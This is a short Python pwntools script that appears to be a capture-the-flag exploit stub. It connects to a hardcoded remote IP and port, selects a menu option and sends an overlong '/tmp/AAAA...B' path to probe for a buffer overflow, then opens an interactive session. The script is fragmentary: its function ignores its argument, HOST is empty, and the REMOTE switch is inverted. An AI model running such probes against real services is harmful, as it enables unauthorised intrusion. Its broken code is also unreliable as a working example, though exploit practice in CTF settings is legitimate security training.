from pwn import *

HOST = ""
PORT = 1234
REMOTE = 0
if(REMOTE):
  s = remote(HOST,PORT)
else:
  s = remote('13.125.131.113',PORT)
def exe_stdin(dat):
  s.recvuntil('>')
  s.sendline('4')
  s.recvuntil(':')
  s.send("/tmp/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAB")
exe_stdin("")
s.interactive()

